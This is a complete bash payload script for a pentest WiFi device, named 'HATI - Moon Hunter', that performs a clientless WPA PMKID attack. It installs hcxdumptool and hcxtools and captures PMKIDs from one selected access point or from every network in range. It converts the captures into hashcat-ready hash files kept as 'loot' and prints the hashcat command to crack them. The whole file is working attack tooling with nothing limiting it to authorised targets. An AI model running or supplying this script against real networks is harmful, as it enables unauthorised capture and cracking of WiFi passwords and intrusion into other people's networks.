#!/bin/bash
# Title: HATI - Moon Hunter
# Description: Clientless WPA PMKID attack - the wolf that hunts in darkness
# Author: HaleHound
# Version: 1.4.4
# Category: user/attack
# Requires: hcxdumptool, hcxpcapngtool (hcxtools)
# Named after: Hati Hróðvitnisson - the wolf that chases the moon
#
# PMKID Attack: Captures the PMKID from the AP's first EAPOL message
# No client connection needed - works even on empty networks
# Output: Hashcat-ready .22000 files for offline cracking
#
# Changelog:
#   1.4.4 - Fixed UI text: B button says "Exit" (matches actual behavior)
#   1.4.3 - Simplified scan_targets (removed spinner, direct _pineap call like device_hunter)
#   1.4.2 - Fixed scan_targets hanging (added 10s timeout to _pineap call)
#   1.4.1 - Fixed B button in target select (now exits instead of switching to broadcast)
#   1.4.0 - Fixed CONFIRMATION_DIALOG handling (was using non-existent variables)
#   1.3.0 - Fixed targeted mode BPF filtering for opkg hcxdumptool 6.3.4
#         - Improved menu dialogs for clarity
#   1.2.0 - Initial release

# === CONFIGURATION ===
LOOTDIR="/root/loot/hati"
INTERFACE="wlan1mon"
INPUT=/dev/input/event0

# === NON-BLOCKING BUTTON CHECK ===
check_for_stop() {
    local data=$(timeout 0.02 dd if=$INPUT bs=16 count=1 2>/dev/null | hexdump -e '16/1 "%02x "' 2>/dev/null)
    [ -z "$data" ] && return 1
    local type=$(echo "$data" | cut -d' ' -f9-10)
    local value=$(echo "$data" | cut -d' ' -f13)
    local keycode=$(echo "$data" | cut -d' ' -f11-12)
    # A button = 31 01 or 30 01
    if [ "$type" = "01 00" ] && [ "$value" = "01" ]; then
        if [ "$keycode" = "31 01" ] || [ "$keycode" = "30 01" ]; then
            return 0
        fi
    fi
    return 1
}

# === CLEANUP ===
cleanup() {
    killall -9 hcxdumptool 2>/dev/null
    rm -f /tmp/hati_running /tmp/hati_status /tmp/hati_target.bpf
    LED WHITE
}

trap cleanup EXIT INT TERM

# === LED PATTERNS ===
led_hunting() {
    LED MAGENTA
}

led_capturing() {
    LED AMBER
}

led_success() {
    LED GREEN
}

led_error() {
    LED RED
}

# === SOUNDS ===
play_start() {
    RINGTONE "start:d=4,o=5,b=200:c6,e6,g6" &
}

play_capture() {
    RINGTONE "cap:d=8,o=6,b=180:g,a,b" &
}

play_success() {
    RINGTONE "success:d=4,o=5,b=180:c6,e6,g6,c7" &
}

play_fail() {
    RINGTONE "fail:d=4,o=4,b=120:g,e,c" &
}

# === TOOL CHECK ===
check_tools() {
    local missing=""

    if ! command -v hcxdumptool >/dev/null 2>&1; then
        missing="hcxdumptool"
    fi

    if ! command -v hcxpcapngtool >/dev/null 2>&1; then
        if [ -n "$missing" ]; then
            missing="$missing, hcxpcapngtool"
        else
            missing="hcxpcapngtool"
        fi
    fi

    if [ -n "$missing" ]; then
        return 1
    fi
    return 0
}

install_tools() {
    LOG "Installing tools..."
    LOG ""
    LOG "Updating opkg..."
    timeout 60 opkg update >/dev/null 2>&1
    LOG "Installing hcxdumptool..."
    timeout 120 opkg install hcxdumptool >/dev/null 2>&1
    LOG "Installing hcxtools..."
    timeout 120 opkg install hcxtools >/dev/null 2>&1
    LOG ""

    if check_tools; then
        LOG "Tools installed successfully"
        return 0
    else
        LOG "Installation failed"
        return 1
    fi
}

# === TARGET SELECTION ===
declare -a AP_MACS
declare -a AP_SSIDS
declare -a AP_CHANNELS
SELECTED=0
TOTAL_APS=0

scan_targets() {
    LOG "Scanning for targets..."

    # Direct call like device_hunter - no spinner to avoid issues
    local json=$(_pineap RECON APS limit=20 format=json)

    AP_MACS=()
    AP_SSIDS=()
    AP_CHANNELS=()

    while read -r mac; do
        AP_MACS+=("$mac")
    done < <(echo "$json" | grep -o '"mac":"[^"]*"' | sed 's/"mac":"//;s/"//')

    while read -r ssid; do
        [ -z "$ssid" ] && ssid="[Hidden]"
        AP_SSIDS+=("$ssid")
    done < <(echo "$json" | grep -o '"ssid":"[^"]*"' | head -30 | sed 's/"ssid":"//;s/"//')

    while read -r ch; do
        AP_CHANNELS+=("$ch")
    done < <(echo "$json" | grep -o '"channel":[0-9]*' | head -30 | sed 's/"channel"://')

    TOTAL_APS=${#AP_MACS[@]}

    if [ $TOTAL_APS -eq 0 ]; then
        LOG "No targets found"
        LOG "Start Recon first"
        return 1
    fi
    LOG "Found $TOTAL_APS targets"
    return 0
}

show_target() {
    LOG ""
    LOG "[$((SELECTED + 1))/$TOTAL_APS] ${AP_SSIDS[$SELECTED]}"
    LOG "${AP_MACS[$SELECTED]}"
    LOG "Channel: ${AP_CHANNELS[$SELECTED]}"
    LOG ""
    LOG "[UP/DOWN] Scroll  [A] Select"
    LOG "[B] Exit"
}

select_target() {
    SELECTED=0
    show_target

    while true; do
        local btn=$(WAIT_FOR_INPUT)
        case "$btn" in
            UP|LEFT)
                SELECTED=$((SELECTED - 1))
                [ $SELECTED -lt 0 ] && SELECTED=$((TOTAL_APS - 1))
                show_target
                ;;
            DOWN|RIGHT)
                SELECTED=$((SELECTED + 1))
                [ $SELECTED -ge $TOTAL_APS ] && SELECTED=0
                show_target
                ;;
            A)
                return 0
                ;;
            B|BACK)
                return 1
                ;;
        esac
    done
}

# === PMKID CAPTURE ===
capture_pmkid() {
    local mode=$1
    local target_mac=$2
    local target_channel=$3
    local duration=$4

    local timestamp=$(date +%Y%m%d_%H%M%S)
    local capfile="$LOOTDIR/hati_${timestamp}.pcapng"
    local hashfile="$LOOTDIR/hati_${timestamp}.22000"
    local bpffile="/tmp/hati_target.bpf"

    mkdir -p "$LOOTDIR"

    LOG ""
    LOG "=== HATI - MOON HUNTER ==="
    LOG ""

    if [ "$mode" = "targeted" ]; then
        LOG "Target: $target_mac"
        LOG "Channel: $target_channel"
    else
        LOG "Mode: BROADCAST (All APs)"
    fi

    LOG "Duration: ${duration}s"
    LOG "Output: $capfile"
    LOG ""
    LOG "[A] = Stop capture early"
    LOG ""

    led_capturing
    play_start
    VIBRATE

    # Build hcxdumptool command
    local cmd="hcxdumptool -i $INTERFACE -w $capfile --rds=1"

    if [ "$mode" = "targeted" ]; then
        # Create BPF filter for target MAC
        # Remove colons from MAC for BPF filter format
        local mac_no_colons=$(echo "$target_mac" | tr -d ':' | tr '[:upper:]' '[:lower:]')

        # Compile BPF filter using hcxdumptool's built-in compiler
        LOG "Creating target filter..."
        if ! hcxdumptool --bpfc="wlan addr3 $mac_no_colons" > "$bpffile" 2>/dev/null; then
            # Fallback: try without BPF if compilation fails
            LOG "BPF filter failed, using channel lock only"
            rm -f "$bpffile"
        else
            cmd="$cmd --bpf=$bpffile"
        fi

        # Lock to target channel (add band indicator)
        if [ -n "$target_channel" ]; then
            if [ "$target_channel" -le 14 ]; then
                cmd="$cmd -c ${target_channel}a"  # 2.4GHz band
            else
                cmd="$cmd -c ${target_channel}b"  # 5GHz band
            fi
        fi
    else
        # Broadcast mode: Scan all frequencies
        cmd="$cmd -F"
    fi

    # Start capture in background
    LOG "Starting PMKID capture..."
    $cmd > /tmp/hati_status 2>&1 &
    local cap_pid=$!

    sleep 1

    if ! kill -0 $cap_pid 2>/dev/null; then
        led_error
        play_fail
        LOG "Capture failed to start"
        LOG ""
        # Show error details
        head -10 /tmp/hati_status 2>/dev/null
        rm -f "$bpffile"
        return 1
    fi

    # Monitor capture with countdown
    local elapsed=0
    local pmkid_count=0
    local last_status=""

    while [ $elapsed -lt $duration ]; do
        if check_for_stop; then
            LOG ""
            LOG "Stopping capture..."
            kill -9 $cap_pid 2>/dev/null
            break
        fi

        if ! kill -0 $cap_pid 2>/dev/null; then
            LOG "Capture ended"
            break
        fi

        # Check for PMKID captures in output
        local status=$(tail -5 /tmp/hati_status 2>/dev/null | grep -i "pmkid" | tail -1)
        if [ -n "$status" ] && [ "$status" != "$last_status" ]; then
            play_capture
            VIBRATE 50
            led_success
            pmkid_count=$((pmkid_count + 1))
            LOG "PMKID #$pmkid_count captured!"
            last_status="$status"
            sleep 0.2
            led_capturing
        fi

        local remaining=$((duration - elapsed))
        LOG "[${remaining}s] Hunting... ($pmkid_count PMKIDs)"

        sleep 1
        elapsed=$((elapsed + 1))
    done

    # Stop capture
    kill -9 $cap_pid 2>/dev/null
    wait $cap_pid 2>/dev/null

    LOG ""
    LOG ""
    LOG "Capture complete"

    # Check if we got anything
    if [ ! -f "$capfile" ] || [ ! -s "$capfile" ]; then
        led_error
        play_fail
        LOG "No capture file created"
        rm -f "$bpffile"
        return 1
    fi

    # Convert to hashcat format
    LOG "Converting to hashcat format..."
    CONV_ID=$(START_SPINNER "Converting...")

    hcxpcapngtool -o "$hashfile" -E "$LOOTDIR/essid_${timestamp}.txt" "$capfile" 2>/tmp/convert_status

    STOP_SPINNER "$CONV_ID"

    # Count results
    local hash_count=0
    if [ -f "$hashfile" ] && [ -s "$hashfile" ]; then
        hash_count=$(wc -l < "$hashfile")
    fi

    rm -f "$bpffile"

    # Results
    LOG ""
    LOG "=== RESULTS ==="

    if [ $hash_count -gt 0 ]; then
        led_success
        play_success
        VIBRATE
        VIBRATE

        LOG "PMKIDs captured: $hash_count"
        LOG ""
        LOG "Files saved:"
        LOG "  PCAP: $capfile"
        LOG "  Hash: $hashfile"
        LOG ""
        LOG "Crack with:"
        LOG "  hashcat -m 22000 $hashfile wordlist.txt"

        ALERT "SUCCESS!\n\nCaptured: $hash_count PMKIDs\n\nSaved to:\n$LOOTDIR\n\nCrack with:\nhashcat -m 22000"

        return 0
    else
        led_error
        play_fail

        LOG "No PMKIDs captured"
        LOG ""
        LOG "Possible reasons:"
        LOG "  - AP doesn't support PMKID"
        LOG "  - WPA3-only network"
        LOG "  - Out of range"
        LOG "  - Try longer duration"

        # Keep pcap anyway - might have handshakes
        if [ -f "$capfile" ] && [ -s "$capfile" ]; then
            LOG ""
            LOG "PCAP saved (may contain handshakes):"
            LOG "  $capfile"
        fi

        ALERT "No PMKIDs Found\n\nTry:\n- Longer duration\n- Different target\n- Move closer to AP\n\nPCAP saved anyway"

        return 1
    fi
}

# === MAIN ===

LOG ""
LOG " _  _   _ _____ ___ "
LOG "| || | /_\\_   _|_ _|"
LOG "| __ |/ _ \\| |  | | "
LOG "|_||_/_/ \\_\\_| |___|"
LOG ""
LOG "    HATI v1.4.4 - Moon Hunter"
LOG ""
LOG " Clientless WPA PMKID Attack"
LOG ""

# Check for required tools
if ! check_tools; then
    LOG "Required tools not installed"

    # CONFIRMATION_DIALOG returns "1" for Yes, "0" for No
    if [ "$(CONFIRMATION_DIALOG "TOOLS NEEDED\n\nhcxdumptool + hcxtools\nWill install from opkg.\n\nInstall now?")" = "1" ]; then
        if ! install_tools; then
            ERROR_DIALOG "Install Failed\n\nTry manually:\nopkg update\nopkg install hcxdumptool hcxtools"
            exit 0
        fi
    else
        LOG "Tools required - exiting"
        exit 0
    fi
fi

LOG "Tools ready"
LOG ""

# Mode selection - "1" = Yes (All), "0" = No (Specific)
TARGET_MODE="all"
TARGET_MAC=""
TARGET_CHANNEL=""

if [ "$(CONFIRMATION_DIALOG "SCAN ALL NETWORKS?\n\nYes = All APs at once\nNo = Pick one target")" = "1" ]; then
    # User selected YES - Broadcast mode
    TARGET_MODE="all"
    LOG "Mode: Broadcast (All APs)"
else
    # User selected NO - Targeted mode
    TARGET_MODE="targeted"
    LOG "Mode: Targeted"

    # Scan for targets
    if ! scan_targets; then
        ERROR_DIALOG "NO TARGETS\n\nNo APs found in Recon data.\n\nRun Recon scan first."
        exit 0
    fi

    # Let user pick target
    if ! select_target; then
        # User pressed B - exit payload
        LOG "Cancelled - exiting"
        exit 0
    fi

    # Target selected
    if true; then
        TARGET_MAC="${AP_MACS[$SELECTED]}"
        TARGET_CHANNEL="${AP_CHANNELS[$SELECTED]}"

        LOG "Selected: ${AP_SSIDS[$SELECTED]}"
        LOG "MAC: $TARGET_MAC"
        LOG "Channel: $TARGET_CHANNEL"
    fi
fi

# Duration selection with guidance
duration=$(NUMBER_PICKER "HUNT DURATION\n\n30s  = Quick scan\n60s  = Normal\n120s = Deep scan\n\nSeconds:" 60)

# Validate duration bounds
if [ -z "$duration" ] || [ "$duration" -lt 10 ] 2>/dev/null; then
    duration=60
fi
if [ "$duration" -gt 600 ]; then
    duration=600
fi

# Confirm and start
confirm_msg="READY TO HUNT\n\nMode: "
if [ "$TARGET_MODE" = "all" ]; then
    confirm_msg="${confirm_msg}BROADCAST (All APs)"
else
    confirm_msg="${confirm_msg}${AP_SSIDS[$SELECTED]}"
fi
confirm_msg="${confirm_msg}\nTime: ${duration}s\n\nStart capture?"

if [ "$(CONFIRMATION_DIALOG "$confirm_msg")" = "1" ]; then
    # Run capture
    led_hunting
    capture_pmkid "$TARGET_MODE" "$TARGET_MAC" "$TARGET_CHANNEL" "$duration"
else
    LOG "Cancelled by user"
fi

LED WHITE
LOG ""
LOG "HATI hunt complete"
